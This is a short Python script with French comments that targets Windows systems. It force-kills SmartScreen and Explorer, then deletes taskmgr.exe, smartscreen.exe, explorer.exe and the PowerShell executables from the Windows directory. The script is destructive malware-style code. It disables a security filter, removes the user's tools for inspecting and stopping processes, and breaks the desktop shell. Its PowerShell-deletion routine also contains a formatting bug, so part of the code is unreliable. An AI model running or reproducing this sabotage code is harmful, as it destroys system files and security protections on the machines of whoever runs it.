#!/usr/bin/python
#coding:utf-8
import os, sys
# ENVIRONMENT VARIABLE
d = os.environ["SystemDrive"]
usr = os.environ["USERNAME"]

class Kill():
    """ Classe qui permet de kill les processus """
    def __init__(self):
        self.f = "/F"
        self.k1 = "START /MIN taskkill /IM"
    # Function to kill SmartScreen (Windows10)
    def smart(self):
        try:
            killed = "{} smartscreen.exe {}".format(self.k1, self.f)
            os.system(killed)
        except Exception:
            killed = 0
        return killed
    # Function to kill explorer
    def exp(self):
        try:
            killed = "{} explorer.exe {}".format(self.k1, self.f)
            os.system(killed)
        except Exception:
            killed = 0
        return killed

class Remove():
    """ Classe qui permet de supprimer les processus """
    def __init__(self):
        self.ex = "del"
        self.r1 = "{}\\Windows\\System32\\".format(d)
    # Function to delete process in the directory specified
    def stsk(self):
        procs = ['taskmgr.exe', 'smartscreen.exe']
        for proc in procs:
            ex = "{} {}{}".format(self.ex, self.r1, proc)
            os.system(ex)
    # Function to delete gui process on windows
    def exp(self):
        cmd = "{} \\windows\\explorer.exe ".format(self.ex)
        os.system(cmd)
    # Function to delete the powershell on the system
    def power(self):
        pwr_sh = ['powershell.exe', 'powershell_ise.exe']
        for proc in pwr_sh:
            cmd = "{} \\windows\\system32\\WindowsPowerShell\\v1.0\\".format(self.ex, proc)
            os.system(cmd)
